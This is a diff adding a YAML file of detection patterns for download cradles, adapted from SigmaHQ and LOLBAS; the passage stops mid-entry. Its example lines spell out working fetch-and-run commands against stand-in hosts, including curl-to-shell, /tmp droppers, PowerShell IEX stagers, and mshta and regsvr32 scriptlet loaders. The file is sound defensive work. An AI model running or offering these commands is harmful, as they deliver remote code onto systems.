@@ -1,0 +1,640 @@
+# Mention patterns for download cradles: text that fetches remote content and runs it, or stages it for running,
+# through the shell, PowerShell or a Windows signed binary. Sources are SigmaHQ rules and the LOLBAS project, cited
+# per entry. Vendor installers are published as `curl ... | sh` and `iex (irm ...)`, so the generic pipe-to-shell
+# shapes are weak or medium; the strong entries add what installers do not do (a raw IP host, a temp-directory
+# chmod-and-run, a script engine pointed at a URL).
+
+- id: mention.cradle_raw_ip_http_to_interpreter
+  title: 'http:// raw-IP URL with a pipe into a shell or iex'
+  match:
+    anchored: 'http://(?:(?:[0-9]{1,2}|1[0-57-9][0-9]|16[0-8]|[02-9][0-9]{2})\.[0-9]{1,3}|169\.(?:[0-9]{1,2}|1[0-9]{2}|2[0-46-9][0-9]|25[0-35-9]))\.[0-9]{1,3}\.[0-9]{1,3}[^\n|]{0,300}\| {0,3}(?:sudo )?(?:(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh|iex|Invoke-Expression)\b'
+  case_sensitive: false
+  strength: strong
+  attack: [T1105, T1059.004, T1059.001]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Linux Shell Pipe to Shell (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/process_creation/proc_creation_lnx_susp_pipe_shell.yml
+    license: DRL-1.1
+    upstream_id: 880973f3-9708-491c-a77b-2a35a1921158
+  rationale: >-
+    Narrows the rule's pipe-to-shell shape to a plain-HTTP URL whose host is an IP address, piped into a shell or
+    PowerShell's iex. Vendor install scripts are served from named HTTPS hosts; botnet loaders, exploit payloads and
+    hands-on intruders fetch from bare IPs over plain HTTP. Pipes into python or perl are not matched because 'curl
+    http://<ip>:9200/... | python3 -m json.tool' and instance-metadata queries are everyday admin idioms. An internal
+    installer served by IP over plain HTTP is the known benign case and stays strong by choice: it is rare and worth a
+    look. The link-local metadata range 169.254.0.0/16 is excluded (cloud bootstrap reads user-data from
+    169.254.169.254); it is the separate medium entry.
+  examples:
+    positive:
+      - 'Nov 20 11:00:00 web01 bash[6000]: HISTORY: curl -s http://203.0.113.7/x.sh | sh'
+      - 'Nov 20 11:00:01 web01 java[2001]: Runtime exec: wget -qO- http://198.51.100.2:8080/i | bash'
+      - 'powershell -c "irm http://203.0.113.7/a.ps1 | iex"'
+    negative:
+      - 'Nov 20 11:00:02 web01 bash[6001]: HISTORY: curl -fsSL https://get.docker.com | sh'
+      - 'Nov 20 11:00:03 mon01 bash[6002]: HISTORY: curl -s http://10.0.0.5:9100/metrics | grep node_load'
+      - 'Nov 20 11:00:04 cloud01 cloud-init[612]: curl -s http://169.254.169.254/latest/user-data | sh'
+
+- id: mention.cradle_metadata_ip_to_shell
+  title: Instance-metadata address with a pipe into a shell or iex
+  match:
+    anchored: 'http://169\.254\.[0-9]{1,3}\.[0-9]{1,3}[^\n|]{0,300}\| {0,3}(?:sudo )?(?:(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh|iex|Invoke-Expression)\b'
+  case_sensitive: false
+  strength: medium
+  attack: [T1105, T1059.004, T1552.005]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Linux Shell Pipe to Shell (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/process_creation/proc_creation_lnx_susp_pipe_shell.yml
+    license: DRL-1.1
+    upstream_id: 880973f3-9708-491c-a77b-2a35a1921158
+  rationale: >-
+    The pipe-to-shell shape with a link-local metadata URL. Cloud bootstrap scripts run user-data this way, and an
+    intruder who controls user-data or a metadata proxy gets the same line, so it is medium.
+  examples:
+    positive:
+      - 'Nov 20 11:00:04 cloud01 cloud-init[612]: curl -s http://169.254.169.254/latest/user-data | sh'
+    negative:
+      - 'Nov 20 11:00:05 cloud01 bash[6002]: HISTORY: curl -s http://169.254.169.254/latest/meta-data/instance-id'
+      - 'Nov 20 11:00:06 cloud01 bash[6003]: HISTORY: curl -s http://169.254.169.254/latest/meta-data/iam/info | python3 -m json.tool'
+
+- id: mention.cradle_raw_ip_https_to_interpreter
+  title: 'https:// raw-IP URL with a pipe into a shell or iex'
+  match:
+    anchored: 'https://[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}[^\n|]{0,300}\| {0,3}(?:sudo )?(?:(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh|iex|Invoke-Expression)\b'
+  case_sensitive: false
+  strength: medium
+  attack: [T1105, T1059.004, T1059.001]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Linux Shell Pipe to Shell (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/process_creation/proc_creation_lnx_susp_pipe_shell.yml
+    license: DRL-1.1
+    upstream_id: 880973f3-9708-491c-a77b-2a35a1921158
+  rationale: >-
+    The HTTPS form of the raw-IP cradle, piped into a shell or iex. Configuration-management agents are bootstrapped
+    this way from internal servers by IP (Puppet's 'curl -k https://<ip>:8140/packages/current/install.bash | sudo
+    bash'), so it is medium; plain-HTTP raw-IP cradles are the strong entry.
+  examples:
+    positive:
+      - 'Nov 20 11:01:00 web01 bash[6003]: HISTORY: curl -k https://203.0.113.7:8443/s | bash'
+    negative:
+      - 'Nov 20 11:01:01 web01 bash[6004]: HISTORY: curl -sk https://10.0.0.5:6443/healthz'
+      - 'Nov 20 11:01:02 web01 bash[6005]: HISTORY: curl -fsSL https://sh.rustup.rs | sh -s -- -y'
+
+- id: mention.cradle_curl_pipe_shell
+  title: 'curl with a pipe into a shell'
+  match:
+    anchored: 'curl [^\n|]{0,300}\| {0,3}(?:sudo )?(?:-E )?(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b'
+  case_sensitive: false
+  strength: weak
+  attack: [T1105, T1059.004]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Linux Shell Pipe to Shell (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/process_creation/proc_creation_lnx_susp_pipe_shell.yml
+    license: DRL-1.1
+    upstream_id: 880973f3-9708-491c-a77b-2a35a1921158
+  rationale: >-
+    Any 'curl ... | sh'. It is how droppers run, but also how Docker, rustup, nvm, k3s and many other tools are
+    installed, so it is a weak candidate; the host in the URL decides.
+  examples:
+    positive:
+      - 'Nov 20 11:02:00 web01 bash[6006]: HISTORY: curl -fsSL https://get.docker.com | sh'
+    negative:
+      - 'Nov 20 11:02:01 web01 bash[6007]: HISTORY: curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc'
+      - 'Nov 20 11:02:02 web01 bash[6008]: HISTORY: curl -s https://api.example.org/v1/status | jq .'
+
+- id: mention.cradle_wget_pipe_shell
+  title: 'wget with a pipe into a shell'
+  match:
+    anchored: 'wget [^\n|]{0,300}\| {0,3}(?:sudo )?(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b'
+  case_sensitive: false
+  strength: weak
+  attack: [T1105, T1059.004]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Linux Shell Pipe to Shell (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/process_creation/proc_creation_lnx_susp_pipe_shell.yml
+    license: DRL-1.1
+    upstream_id: 880973f3-9708-491c-a77b-2a35a1921158
+  rationale: >-
+    Any 'wget -O- ... | sh'. Same reasoning as the curl entry: droppers and some installers both do it, so it is
+    a weak candidate.
+  examples:
+    positive:
+      - 'Nov 20 11:03:00 web01 bash[6009]: HISTORY: wget -qO- https://install.example.org/agent.sh | sudo bash'
+    negative:
+      - 'Nov 20 11:03:01 web01 bash[6010]: HISTORY: wget -q https://mirror.example.org/pkg.tar.gz -O /opt/pkg.tar.gz'
+      - 'Nov 20 11:03:02 web01 bash[6011]: HISTORY: wget -qO- https://repo.example.org/key.asc | gpg --dearmor'
+
+- id: mention.cradle_curl_chmod_run
+  title: 'curl, chmod and temp-directory execution text in one command line'
+  match:
+    anchored: 'curl [^\n]{1,200}(?:;|&&) {0,2}chmod {1,3}(?:\+x|[ua]\+x|[0-7]{3,4}) {1,3}[^\n]{0,40}(?:/tmp/|/var/tmp/|/dev/shm/)[\w ./+*$>{}"''-]{0,100}(?:;|&&) {0,2}(?:nohup )?(?:/tmp/|/var/tmp/|/dev/shm/)'
+  case_sensitive: false
+  strength: strong
+  attack: [T1105, T1222.002, T1059.004]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Suspicious Download and Execute Pattern via Curl/Wget (Aayush Gupta)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/process_creation/proc_creation_lnx_curl_wget_exec_tmp.yml
+    license: DRL-1.1
+    upstream_id: a2d9e2f3-0f43-4c7a-bcd9-9acfc0d723aa
+  rationale: >-
+    Fetch into /tmp, /var/tmp or /dev/shm, make executable and run it from there, in one line: the dropper sequence
+    of botnets, miners and exploit payloads. Vendor bootstrap scripts (for example get_helm.sh) are fetched and run
+    from the current directory, which the medium entry covers.
+  examples:
+    positive:
+      - 'Nov 20 11:04:00 web01 bash[6012]: HISTORY: curl -o /tmp/k http://203.0.113.7/k; chmod +x /tmp/k; /tmp/k'
+      - 'Nov 20 11:04:01 web01 bash[6013]: HISTORY: curl -s http://203.0.113.7/xmr -o /dev/shm/xmr && chmod 755 /dev/shm/xmr && nohup /dev/shm/xmr -B'
+    negative:
+      - 'Nov 20 11:04:02 web01 bash[6014]: HISTORY: curl -Lo /usr/local/bin/kubectl https://dl.k8s.io/release/v1.31.0/bin/linux/amd64/kubectl && chmod +x /usr/local/bin/kubectl'
+      - 'Nov 20 11:04:03 web01 bash[6015]: HISTORY: curl -s https://api.example.org/v1/status'
+
+- id: mention.cradle_wget_chmod_run
+  title: 'wget, chmod and temp-directory execution text in one command line'
+  match:
+    anchored: 'wget [^\n]{1,200}(?:;|&&) {0,2}chmod {1,3}(?:\+x|[ua]\+x|[0-7]{3,4}) {1,3}[^\n]{0,40}(?:/tmp/|/var/tmp/|/dev/shm/)[\w ./+*$>{}"''-]{0,100}(?:;|&&) {0,2}(?:nohup )?(?:/tmp/|/var/tmp/|/dev/shm/)'
+  case_sensitive: false
+  strength: strong
+  attack: [T1105, T1222.002, T1059.004]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Suspicious Download and Execute Pattern via Curl/Wget (Aayush Gupta)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/process_creation/proc_creation_lnx_curl_wget_exec_tmp.yml
+    license: DRL-1.1
+    upstream_id: a2d9e2f3-0f43-4c7a-bcd9-9acfc0d723aa
+  rationale: >-
+    The wget form of the temp-directory fetch-chmod-run dropper used by Mirai-family loaders and miner kits. Same
+    reasoning as the curl entry; the current-directory form is the medium entry.
+  examples:
+    positive:
+      - 'Nov 20 11:05:00 cam01 sh[300]: wget http://203.0.113.7/bins/mips -O /tmp/mips; chmod 777 /tmp/mips; /tmp/mips telnet.mips'
+    negative:
+      - 'Nov 20 11:05:01 web01 bash[6016]: HISTORY: wget -O /usr/local/bin/jq https://example.org/jq && chmod +x /usr/local/bin/jq'
+      - 'Nov 20 11:05:02 web01 bash[6017]: HISTORY: wget -q https://mirror.example.org/sha256sums.txt'
+
+- id: mention.cradle_download_chmod_run_cwd
+  title: 'chmod then ./ or shell invocation text in one command line'
+  match:
+    anchored: 'chmod {1,3}(?:\+x|[ua]\+x|[0-7]{3,4}) {1,3}[^\n]{1,100}(?:;|&&) {0,2}(?:\./|nohup \./|sh |bash )'
+  case_sensitive: false
+  strength: weak
+  attack: [T1105, T1222.002, T1059.004]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Suspicious Download and Execute Pattern via Curl/Wget (Aayush Gupta)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/process_creation/proc_creation_lnx_curl_wget_exec_tmp.yml
+    license: DRL-1.1
+    upstream_id: a2d9e2f3-0f43-4c7a-bcd9-9acfc0d723aa
+  rationale: >-
+    Making a file executable and running it on the same line ('chmod +x x; ./x'). Droppers do this after cd /tmp,
+    and so do official bootstrap scripts (helm, k3s) and developers, so it is a weak candidate; the temp-directory
+    entries are the strong form.
+  examples:
+    positive:
+      - 'Nov 20 11:05:03 cam01 sh[300]: cd /tmp; wget http://203.0.113.7/bins/mips; chmod 777 mips; ./mips telnet.mips'
+    negative:
+      - 'Nov 20 11:05:04 web01 bash[6023]: HISTORY: chmod +x /usr/local/bin/kubectl'
+      - 'Nov 20 11:05:05 web01 bash[6024]: HISTORY: chmod 600 ~/.ssh/id_ed25519'
+
+- id: mention.cradle_chmod_exec_in_dev_shm
+  title: 'chmod execute mode on a /dev/shm path'
+  match:
+    anchored: 'chmod {1,3}(?:\+x|[ua]\+x|[0-7]{3,4}) {1,3}/dev/shm/'
+  case_sensitive: false
+  strength: strong
+  attack: [T1222.002, T1059.004]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Process Execution From Shared Memory Directory (Stan Beukers)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/process_creation/proc_creation_lnx_susp_exec_from_dev_shm.yml
+    license: DRL-1.1
+    upstream_id: 5cd16c8f-44a6-4654-81e7-a84d6db507d4
+  rationale: >-
+    /dev/shm is a memory-backed directory used for IPC; making a file there executable prepares an in-memory payload
+    that leaves nothing on disk. The rule notes that IPC users of /dev/shm do not spawn executables from it.
+  examples:
+    positive:
+      - 'Nov 20 11:06:00 web01 bash[6018]: HISTORY: chmod +x /dev/shm/.x && /dev/shm/.x'
+    negative:
+      - 'Nov 20 11:06:01 db01 postgres[700]: could not open shared memory segment "/dev/shm/PostgreSQL.1234": No such file'
+      - 'Nov 20 11:06:02 web01 bash[6019]: HISTORY: df -h /dev/shm'
+
+- id: mention.cradle_cd_dev_shm
+  title: 'cd /dev/shm command text'
+  match:
+    literal: ['cd /dev/shm']
+  case_sensitive: false
+  strength: medium
+  attack: [T1059.004]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Process Execution From Shared Memory Directory (Stan Beukers)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/process_creation/proc_creation_lnx_susp_exec_from_dev_shm.yml
+    license: DRL-1.1
+    upstream_id: 5cd16c8f-44a6-4654-81e7-a84d6db507d4
+  rationale: >-
+    Intruders move into /dev/shm before dropping payloads because it is writable and memory-backed; administrators
+    rarely change into it except while debugging IPC, so it is medium.
+  examples:
+    positive:
+      - 'Nov 20 11:07:00 web01 bash[6020]: HISTORY: cd /dev/shm; wget http://203.0.113.7/a'
+    negative:
+      - 'Nov 20 11:07:01 web01 bash[6021]: HISTORY: cd /var/www/html'
+      - 'Nov 20 11:07:02 web01 bash[6022]: HISTORY: ls -la /dev/shm'
+
+- id: mention.cradle_ps_webclient_download
+  title: PowerShell Net.WebClient download into memory
+  match:
+    anchored: 'New-Object {1,3}(?:System\.)?Net\.WebClient\)\.Download(?:String|Data)\('
+  case_sensitive: false
+  strength: medium
+  attack: [T1105, T1059.001]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: PowerShell Download and Execution Cradles (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml
+    license: DRL-1.1
+    upstream_id: 85b0b087-eddf-4a2b-b033-d771fa2b9775
+  rationale: >-
+    '(New-Object Net.WebClient).DownloadString(' pulls a script into memory, the first half of the classic
+    PowerShell cradle. The Chocolatey and Boxstarter installers use exactly this, so it is medium; the URL host
+    decides.
+  examples:
+    positive:
+      - 'powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(''http://203.0.113.7/a.ps1'')"'
+    negative:
+      - 'powershell -c "(New-Object Net.WebClient).Headers.Add(''User-Agent'',''inventory'')"'
+      - 'powershell -c "Invoke-WebRequest https://intranet.example.org/report.csv -OutFile C:\Reports\r.csv"'
+
+- id: mention.cradle_ps_downloadstring_raw_ip
+  title: 'PowerShell ''.DownloadString('' text with a raw IP URL'
+  match:
+    anchored: 'DownloadString\( {0,2}["'']https?://[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'
+  case_sensitive: false
+  strength: strong
+  attack: [T1105, T1059.001]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: PowerShell Download and Execution Cradles (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml
+    license: DRL-1.1
+    upstream_id: 85b0b087-eddf-4a2b-b033-d771fa2b9775
+  rationale: >-
+    Downloading a script into memory from a bare IP address is the stager shape of Empire, Cobalt Strike scripted web
+    delivery and Metasploit web_delivery; legitimate bootstrap scripts are served from named hosts.
+  examples:
+    positive:
+      - 'powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(''http://203.0.113.7:80/a''))"'
+    negative:
+      - 'powershell -c "iex ((New-Object System.Net.WebClient).DownloadString(''https://community.chocolatey.org/install.ps1''))"'
+      - 'powershell -c "$wc.DownloadFile(''http://10.0.0.5/tools/agent.msi'', ''C:\Temp\agent.msi'')"'
+
+- id: mention.cradle_ps_iex_download_prefix
+  title: 'PowerShell iex around a web download'
+  match:
+    literal:
+      - 'iex(new-object net.webclient)'
+      - 'iex (new-object net.webclient)'
+      - 'iex((new-object net.webclient)'
+      - 'iex ((new-object net.webclient)'
+      - 'iex(new-object system.net.webclient)'
+      - 'iex (new-object system.net.webclient)'
+      - 'iex((new-object system.net.webclient)'
+      - 'iex ((new-object system.net.webclient)'
+      - 'iex(iwr '
+      - 'iex (iwr '
+      - 'iex(irm '
+      - 'iex (irm '
+      - 'iex(invoke-webrequest '
+      - 'iex (invoke-webrequest '
+      - 'iex(invoke-restmethod '
+      - 'iex (invoke-restmethod '
+      - 'invoke-expression (new-object net.webclient)'
+      - 'invoke-expression ((new-object net.webclient)'
+  case_sensitive: false
+  strength: medium
+  attack: [T1105, T1059.001]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: PowerShell Download and Execution Cradles (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml
+    license: DRL-1.1
+    upstream_id: 85b0b087-eddf-4a2b-b033-d771fa2b9775
+  rationale: >-
+    The rule pairs a download call with iex anywhere on the line; these literals are the prefix forms where iex wraps
+    the download. Executing a downloaded script without saving it is the cradle; Chocolatey, Scoop and similar
+    installers do the same, so it is medium.
+  examples:
+    positive:
+      - 'powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(''http://evil.example.net/a'')"'
+      - 'powershell -c "iex (irm https://203.0.113.7/p.ps1)"'
+    negative:
+      - 'powershell -c "Invoke-Expression -Command $localScript"'
+      - 'powershell -c "irm https://api.example.org/v1/status | ConvertTo-Json"'
+
+- id: mention.cradle_ps_invoke_web_to_iex
+  title: 'Invoke-WebRequest or Invoke-RestMethod with a pipe into iex'
+  match:
+    anchored: 'Invoke-(?:WebRequest|RestMethod) [^\n|]{1,300}\| {0,3}(?:iex|Invoke-Expression)\b'
+  case_sensitive: false
+  strength: medium
+  attack: [T1105, T1059.001]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: PowerShell Download and Execution Cradles (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml
+    license: DRL-1.1
+    upstream_id: 85b0b087-eddf-4a2b-b033-d771fa2b9775
+  rationale: >-
+    The postfix form of the cradle with the long cmdlet names. Installer one-liners use the same form, so it is
+    medium.
+  examples:
+    positive:
+      - 'powershell -c "Invoke-WebRequest -UseBasicParsing http://203.0.113.7/s.ps1 | iex"'
+    negative:
+      - 'powershell -c "Invoke-WebRequest https://intranet.example.org/a.zip -OutFile C:\Temp\a.zip"'
+      - 'powershell -c "Invoke-RestMethod https://api.example.org/v1/items | Select-Object -First 5"'
+
+- id: mention.cradle_ps_iwr_to_iex
+  title: 'iwr alias with a pipe into iex'
+  match:
+    anchored: 'iwr [^\n|]{1,300}\| {0,3}(?:iex|Invoke-Expression)\b'
+  case_sensitive: false
+  strength: medium
+  attack: [T1105, T1059.001]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: PowerShell Download and Execution Cradles (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml
+    license: DRL-1.1
+    upstream_id: 85b0b087-eddf-4a2b-b033-d771fa2b9775
+  rationale: >-
+    The postfix cradle with the iwr alias; same reasoning as the long form.
+  examples:
+    positive:
+      - 'powershell -ep bypass -c "iwr -useb http://203.0.113.7/x | iex"'
+    negative:
+      - 'powershell -c "iwr https://intranet.example.org/a.zip -OutFile a.zip"'
+      - 'powershell -c "iwr https://api.example.org/health | Select-Object StatusCode"'
+
+- id: mention.cradle_ps_irm_to_iex
+  title: 'irm alias with a pipe into iex'
+  match:
+    anchored: 'irm [^\n|]{1,300}\| {0,3}(?:iex|Invoke-Expression)\b'
+  case_sensitive: false
+  strength: medium
+  attack: [T1105, T1059.001]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: PowerShell Download and Execution Cradles (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml
+    license: DRL-1.1
+    upstream_id: 85b0b087-eddf-4a2b-b033-d771fa2b9775
+  rationale: >-
+    The postfix cradle with the irm alias, as in the rule's own example 'irm test.domain/ffe | iex'. The Scoop and uv
+    installers are published this way, so it is medium.
+  examples:
+    positive:
+      - 'powershell -ep bypass -w h -c irm evil.example.net/ffe | iex'
+    negative:
+      - 'powershell -c "irm https://api.example.org/v1/items | Format-Table"'
+      - 'powershell -c "Get-Content .\notes.txt | Select-String term"'
+
+- id: mention.cradle_certutil_url_download
+  title: 'certutil -urlcache or -verifyctl text with a URL'
+  match:
+    anchored: 'certutil(?:\.exe)?["'']?[^\n]{0,40}[-/](?:urlcache|verifyctl)[^\n]{0,60}(?:https?|ftp)://'
+  case_sensitive: false
+  strength: medium
+  attack: [T1105, T1218]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Suspicious Download Via Certutil.EXE (Florian Roth, Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_certutil_download.yml
+    license: DRL-1.1
+    upstream_id: 19b08b1c-861d-4e75-a1ef-ea0c1baf202b
+  rationale: >-
+    'certutil -urlcache -f URL file' and '-verifyctl -f URL' turn the certificate utility into a downloader (LOLBAS
+    Certutil). Certificate work rarely fetches through these switches, but the rule rates it medium and so does this.
+  examples:
+    positive:
+      - 'C:\Windows\system32\certutil.exe -urlcache -split -f http://203.0.113.7/b.exe C:\Users\Public\b.exe'
+    negative:
+      - 'certutil -urlcache * delete'
+      - 'certutil -verify -urlfetch C:\certs\server.cer'
+
+- id: mention.cradle_certutil_decode
+  title: 'certutil -decode or -decodehex command text'
+  match:
+    anchored: 'certutil(?:\.exe)?["'']?[^\n]{0,40}[-/]decode(?:hex)? '
+  case_sensitive: false
+  strength: medium
+  attack: [T1140]
+  telemetry: [any]
+  source:
+    name: LOLBAS project, Certutil.exe
+    url: https://github.com/LOLBAS-Project/LOLBAS/blob/98a39d57b0a3873d635cd5594f2dbffa83891bc3/yml/OSBinaries/Certutil.yml
+    license: GPL-3.0
+    upstream_id: Certutil.exe
+  rationale: >-
+    'certutil -decode' rebuilds a binary from a base64 text file, a common way to pass payloads through filters.
+    Administrators use it to convert certificates, so it is medium; the output file name decides.
+  examples:
+    positive:
+      - 'certutil -decode C:\Users\Public\a.txt C:\Users\Public\a.exe'
+    negative:
+      - 'certutil -encode C:\certs\server.cer C:\certs\server.b64'
+      - 'certutil -dump C:\certs\server.cer'
+
+- id: mention.cradle_bitsadmin_transfer
+  title: bitsadmin /transfer or /addfile text with a URL
+  match:
+    anchored: 'bitsadmin(?:\.exe)?["'']?[^\n]{0,40}[/-](?:transfer|addfile) [^\n]{0,200}(?:https?|ftp)://'
+  case_sensitive: false
+  strength: medium
+  attack: [T1197, T1105]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: File Download Via Bitsadmin (Michael Haag, FPT.EagleEye)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_bitsadmin_download.yml
+    license: DRL-1.1
+    upstream_id: d059842b-6b9d-4ed1-b5c3-5b89143c6ede
+  rationale: >-
+    The deprecated bitsadmin CLI downloading from a URL is a classic signed-binary download path; the rule covers both
+    the one-shot /transfer form and the /create plus /addfile job form. The rule notes that some legitimate apps use
+    it, so it is medium.
+  examples:
+    positive:
+      - 'bitsadmin /transfer job1 /download /priority high http://203.0.113.7/a.exe C:\Users\Public\a.exe'
+      - 'bitsadmin.exe /addfile AtomicBITS http://203.0.113.7/a.exe C:\Users\Public\a.exe'
+    negative:
+      - 'bitsadmin /list /allusers'
+      - 'bitsadmin /info job1 /verbose'
+
+- id: mention.cradle_mshta_remote
+  title: 'mshta command text with an http, https or ftp URL'
+  match:
+    anchored: 'mshta(?:\.exe)?["'']? {1,3}["'']?(?:https?|ftp)://'
+  case_sensitive: false
+  strength: strong
+  attack: [T1218.005, T1105]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Remotely Hosted HTA File Executed Via Mshta.EXE (Nasreddine Bencherchali, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_mshta_http.yml
+    license: DRL-1.1
+    upstream_id: b98d0db6-511d-45de-ad02-e82a98729620
+  rationale: >-
+    mshta executes HTML applications with full script rights; pointing it at a URL runs remote code under a signed
+    binary. Line-of-business HTAs are run from local or share paths, not URLs.
+  examples:
+    positive:
+      - 'C:\Windows\System32\mshta.exe http://203.0.113.7/a.hta'
+    negative:
+      - 'C:\Windows\System32\mshta.exe C:\Program Files\Vendor\setup.hta'
+      - 'C:\Windows\System32\mshta.exe "\\fileserver\apps\launcher.hta"'
+
+- id: mention.cradle_mshta_inline_script
+  title: 'mshta command text with a vbscript: or javascript: argument'
+  match:
+    anchored: 'mshta(?:\.exe)?["'']? {1,3}["'']?(?:vbscript|javascript):'
+  case_sensitive: false
+  strength: strong
+  attack: [T1218.005, T1059.005, T1059.007]
+  telemetry: [any]
+  source:
+    name: LOLBAS project, Mshta.exe
+    url: https://github.com/LOLBAS-Project/LOLBAS/blob/98a39d57b0a3873d635cd5594f2dbffa83891bc3/yml/OSBinaries/Mshta.yml
+    license: GPL-3.0
+    upstream_id: Mshta.exe
+  rationale: >-
+    'mshta vbscript:Close(Execute(GetObject("script:URL")))' and the javascript: form run script given on the command
+    line, usually pulling a scriptlet from a URL. No legitimate software launches mshta this way.
+  examples:
+    positive:
+      - 'mshta.exe vbscript:Close(Execute("GetObject(""script:http://203.0.113.7/a.sct"")"))'
+      - 'mshta.exe javascript:a=GetObject("script:http://203.0.113.7/a.sct").Exec();close();'
+    negative:
+      - 'mshta.exe C:\Tools\hta\inventory.hta'
+      - 'C:\Windows\System32\mshta.exe "C:\Program Files\Vendor\about.hta"'
+
+- id: mention.cradle_regsvr32_remote_scriptlet
+  title: 'regsvr32 /i: argument with a URL (Squiblydoo text)'
+  match:
+    anchored: 'regsvr32(?:\.exe)?["'']? [^\n]{0,80}[/-]i:["'']?(?:https?|ftp)://'
+  case_sensitive: false
+  strength: strong
+  attack: [T1218.010, T1105]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Potentially Suspicious Regsvr32 HTTP/FTP Pattern (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_regsvr32_network_pattern.yml
+    license: DRL-1.1
+    upstream_id: 867356ee-9352-41c9-a8f2-1be690d78216
+  rationale: >-
+    'regsvr32 /s /n /u /i:URL scrobj.dll' runs a remote COM scriptlet under a signed binary. The rule accepts any
+    /i with http; this entry requires the URL to be the /i argument itself, which is the Squiblydoo technique and has
+    no legitimate use.
+  examples:
+    positive:
+      - 'regsvr32 /s /n /u /i:http://203.0.113.7/file.sct scrobj.dll'
+    negative:
+      - 'regsvr32 /s C:\Program Files\Vendor\plugin.dll'
+      - 'regsvr32 /u /s "C:\Program Files\Vendor\old.ocx"'
+
+- id: mention.cradle_rundll32_javascript
+  title: 'rundll32 command text with a javascript: argument'
+  match:
+    anchored: 'rundll32(?:\.exe)?["'']? {1,3}["'']?javascript:'
+  case_sensitive: false
+  strength: strong
+  attack: [T1218.011, T1059.007]
+  telemetry: [any]
+  source:
+    name: LOLBAS project, Rundll32.exe
